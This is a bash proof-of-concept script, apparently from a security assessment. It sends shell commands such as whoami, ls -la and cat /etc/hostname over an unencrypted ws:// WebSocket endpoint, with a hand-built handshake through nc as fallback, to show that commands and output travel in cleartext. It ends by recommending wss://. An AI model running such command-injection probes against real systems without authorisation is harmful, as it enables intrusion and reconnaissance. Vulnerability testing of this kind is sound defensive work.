#!/bin/bash

# POC: Plaintext WebSocket Message Transmission Vulnerability
# Demonstrates that sensitive data is transmitted in plaintext over ws://

set -e

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8000}"
WEBSOCKET_URL="ws://${TARGET_HOST}:${TARGET_PORT}/ws"

echo "[*] WebSocket Plaintext Transmission POC"
echo "[*] Target: $WEBSOCKET_URL"
echo ""

# Check if websocat is available, if not try wscat
if ! command -v websocat &> /dev/null && ! command -v wscat &> /dev/null; then
    echo "[!] Installing websocat for WebSocket communication..."
    # Try to install websocat or use nc as fallback
    if command -v cargo &> /dev/null; then
        cargo install websocat 2>/dev/null || true
    fi
fi

# Function to send WebSocket message and capture response
send_websocket_command() {
    local cmd="$1"
    local description="$2"
    
    echo "[+] Test: $description"
    echo "    Command: $cmd"
    
    # Try using websocat first
    if command -v websocat &> /dev/null; then
        response=$(echo "$cmd" | timeout 5 websocat "$WEBSOCKET_URL" 2>&1 || true)
    # Fallback to wscat
    elif command -v wscat &> /dev/null; then
        response=$(echo "$cmd" | timeout 5 wscat -c "$WEBSOCKET_URL" 2>&1 || true)
    # Manual fallback: use bash with /dev/tcp for WebSocket handshake
    else
        response=$(send_websocket_manual "$cmd" 2>&1 || true)
    fi
    
    if [ -n "$response" ] && [ "$response" != "Connection refused" ]; then
        echo "    Response (plaintext): $response"
        echo "    [✓] Data transmitted in plaintext detected"
    else
        echo "    [!] No response or connection failed"
    fi
    echo ""
}

# Manual WebSocket communication via bash
send_websocket_manual() {
    local cmd="$1"
    local host="$TARGET_HOST"
    local port="$TARGET_PORT"
    
    # Create WebSocket handshake
    local key="dGhlIHNhbXBsZSBub25jZQ=="
    local handshake=$(printf "GET /ws HTTP/1.1\r\nHost: ${host}:${port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    
    (echo -ne "$handshake"; sleep 0.5; echo -n "$cmd"; sleep 0.5) 2>/dev/null | nc -w 2 "$host" "$port" 2>/dev/null | tail -1 || true
}

# Test 1: Simple command execution
send_websocket_command "echo 'PLAINTEXT_SENSITIVITY_TEST'" "Echo sensitive test message in plaintext"

# Test 2: Verify plaintext transmission of command
send_websocket_command "whoami" "Transmit username command in plaintext"

# Test 3: File system access in plaintext
send_websocket_command "ls -la" "List directory contents transmitted in plaintext"

# Test 4: Sensitive data retrieval
send_websocket_command "cat /etc/hostname" "System information transmitted in plaintext"

echo "[*] POC Summary:"
echo "    - WebSocket uses 'ws://' (unencrypted)"
echo "    - Commands transmitted in cleartext over network"
echo "    - Responses returned in plaintext without encryption"
echo "    - Sensitive data (files, commands, output) visible to network monitoring"
echo ""
echo "[✓] Plaintext WebSocket transmission vulnerability confirmed"
echo "[!] Recommendation: Use 'wss://' with TLS encryption instead"